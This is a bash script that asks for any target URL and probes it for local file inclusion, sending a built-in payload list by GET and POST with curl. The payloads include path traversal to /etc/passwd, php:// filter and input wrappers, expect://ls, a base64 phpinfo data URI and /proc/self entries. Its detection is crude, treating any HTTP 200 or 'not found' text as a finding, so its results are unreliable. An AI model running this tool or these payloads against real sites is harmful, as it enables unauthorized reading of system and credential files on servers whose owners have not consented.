#!/bin/bash

# Function to print output in color
print_color() {
    case "$2" in
        "success")
            echo -e "\e[32m$1\e[0m" ;;
        "info")
            echo -e "\e[33m$1\e[0m" ;;
        "error")
            echo -e "\e[31m$1\e[0m" ;;
        *)
            echo "$1" ;;
    esac
}

# Function to test LFI vulnerability
test_lfi_vulnerability() {
    local target_url="$1"

    # Unique payloads with different patterns
    payloads=(
        "/etc/passwd"
        "../../../../../../../../../../../../../../../etc/passwd"
        "/var/log/apache2/access.log"
        "/var/log/apache2/error.log"
        "/etc/hosts"
        "php://filter/convert.base64-encode/resource=/etc/passwd"
        "file:///etc/passwd"
        "php://input"
        "php://filter/convert.base64-encode/resource=index.php"
        "expect://ls"
        "data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
        "php://input"
        "/proc/self/environ"
        "/proc/self/cmdline"
        "/proc/self/fd/1"
        "/proc/self/fd/2"
        "/proc/self/status"
        "/proc/self/mounts"
        "/proc/self/mem"
        "/proc/self/maps"
        "/proc/self/sched"
        "/proc/self/task"
        "/proc/self/exe"
        "/proc/self/cwd"
        "/proc/self/root"
        "/proc/self/fd"
    )

    print_color "Testing for LFI vulnerability on $target_url" "info"

    # Test payloads
    for payload in "${payloads[@]}"; do
        print_color "Testing payload: $payload" "info"

        # Test GET method
        curl_output=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$target_url/$payload")

        if [ "$curl_output" = "200" ]; then
            print_color "Potential LFI found using payload: $payload" "success"
            print_color "Try accessing sensitive files like $payload by modifying the URL." "info"
            continue
        fi

        # Test POST method
        curl_output=$(curl -s -o /dev/null -w "%{http_code}" -X POST -d "$payload" "$target_url")

        if [ "$curl_output" = "200" ]; then
            print_color "Potential LFI found using payload: $payload" "success"
            print_color "Try accessing sensitive files like $payload by modifying the POST data." "info"
            continue
        fi

        # Check for error messages in response
        error_msg=$(curl -s -X GET "$target_url/$payload" | grep -E "error|Warning|failed|failed to open|not found|failed to|permission denied|access denied")

        if [ -n "$error_msg" ]; then
            print_color "Potential LFI found using payload: $payload" "success"
            print_color "Error message detected: $error_msg" "info"
        fi
    done
}

# Main script
echo -n "Enter your target website URL: "
read target_website

test_lfi_vulnerability "$target_website"
